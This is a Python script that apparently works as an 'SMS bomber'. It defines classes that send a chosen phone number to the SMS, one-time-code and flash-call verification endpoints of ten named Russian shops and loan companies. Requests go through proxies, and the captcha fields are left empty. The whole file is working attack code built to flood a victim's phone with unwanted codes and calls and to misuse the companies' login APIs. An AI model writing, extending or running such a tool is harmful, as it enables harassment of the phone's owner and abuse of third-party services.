import httpx

class Service:
    def __init__(self, url: str, json: dict):
        self.url = url
        self.json = json
    
    async def edit_json(self, phone_number: str):
        pass

    async def send_request(self, proxy_url: str, phone_number: str):
        json = await self.edit_json(phone_number)
        proxy = httpx.Proxy(url=proxy_url)
        try:
            async with httpx.AsyncClient(proxy=proxy) as client:
                response = await client.post(url=self.url, json=json, follow_redirects=True, timeout=5)
                print(f'✅ {proxy_url} - {response.status_code}')
        except Exception as e:
            print(f'❌ {proxy_url} - {e}')


class LetuService(Service):
    def __init__(self):
        super().__init__(
            url='https://www.letu.ru/s/api/user/account/v2/confirmations/phone?pushSite=storeMobileRU',
            json={}
        )
    
    async def edit_json(self, phone_number: str):
        phone_number = f"+7 ({phone_number[1:4]}) {phone_number[4:7]}-{phone_number[7:9]}-{phone_number[9:]}"
        self.json = {
                    "phoneNumber": f"{phone_number}",
                    "captcha": "",
                    "availableModes": [
                        "SMS"
                    ]
                    }
        return self.json
    
class WBService(Service):
    def __init__(self):
        super().__init__(
            url='https://wbx-auth.wildberries.ru/v2/code/wb-captcha',
            json={}
        )
    
    async def edit_json(self, phone_number: str):
        self.json = {
                "phone_number": f"{phone_number}",
                "captcha_token": ""}
        return self.json

class WebBankirService(Service):
    def __init__(self):
        super().__init__(
            url='https://ng-api.webbankir.com/user/v2/sms-verification',
            json={}
        )
    
    async def edit_json(self, phone_number: str):
        self.json = {"data":{"type":"SmsVerification","attributes":{"mobilePhone":f"{phone_number}","birthDate":"2001-04-12","clientIdYandex":"176461943353251648"}}}
        return self.json

class MoneyManService(Service):
    def __init__(self):
        super().__init__(
            url='https://moneyman.ru/private-area/authenticate/send-sms',
            json={}
        )
    
    async def edit_json(self, phone_number: str):
        self.json = {"phone":f"+{phone_number}"}
        return self.json

class BelkaCreditService(Service):
    def __init__(self):
        super().__init__(
            url='https://belkacredit-api-gateway.srv.mendep.ru/user',
            json={}
        )
    
    async def edit_json(self, phone_number: str):
        self.json = {"mobile_phone":f"{phone_number}","step":"Step1","target_url":"https://belkacredit.ru/?utm_source=bankiru&utm_medium=affiliate&utm_campaign=cps_bankiru&clickid=31e3d844373a8922db99cfc029401813&utm_term=bankiru&ndl","requested_amount":None,"requested_days":7,"ga_cid":"456729076.1764620925"}
        return self.json

class NebusService(Service):
    def __init__(self):
        super().__init__(
            url='https://anketa.nebusfinance.ru/api/v1/charon/loan/lead/phone/send?phone=',
            json={}
        )
    
    async def edit_json(self, phone_number: str):
        self.url = f'https://anketa.nebusfinance.ru/api/v1/charon/loan/lead/phone/send?phone={phone_number}'
        self.json = {"phone":f"{phone_number}"}
        return self.json

class PetrovichService(Service):
    def __init__(self):
        super().__init__(
            url='https://api.petrovich.ru/user/v1.1/login/check?pet_case=camel&city_code=spb&client_id=pet_site',
            json={}
        )
    
    async def edit_json(self, phone_number: str):
        self.json = {"type":"phone","login":f"{phone_number}"}
        return self.json

class SokolovService(Service):
    def __init__(self):
        super().__init__(
            url='https://sokolov.ru/api/v4/profile/user/send-code/',
            json={}
        )
    
    async def edit_json(self, phone_number: str):
        self.json = {"data":{"type":"login","attributes":{"phone":f"{phone_number}","verify_method":"flash_call"}}}
        return self.json
    
class FundayService(Service):
    def __init__(self):
        super().__init__(
            url='https://fundayshop.com/web-api/v2/auth/code?layout=adaptive&locale=ru-RU',
            json={}
        )
    
    async def edit_json(self, phone_number: str):
        self.json = {"token":f"{phone_number}","channel":"sms"}
        return self.json

class MetroService(Service):
    def __init__(self):
        super().__init__(
            url='https://api.metro-cc.ru/auth/api/v1/public/send_otp',
            json={}
        )
        
    async def edit_json(self, phone_number: str):
        self.json = {"phone":f"{phone_number}"}
        return self.json

service_list = [
    SokolovService(),
    FundayService(),
    PetrovichService(),
    NebusService(),
    BelkaCreditService(),
    MoneyManService(),
    WebBankirService(),
    WBService(),
    LetuService(),
    MetroService(),
]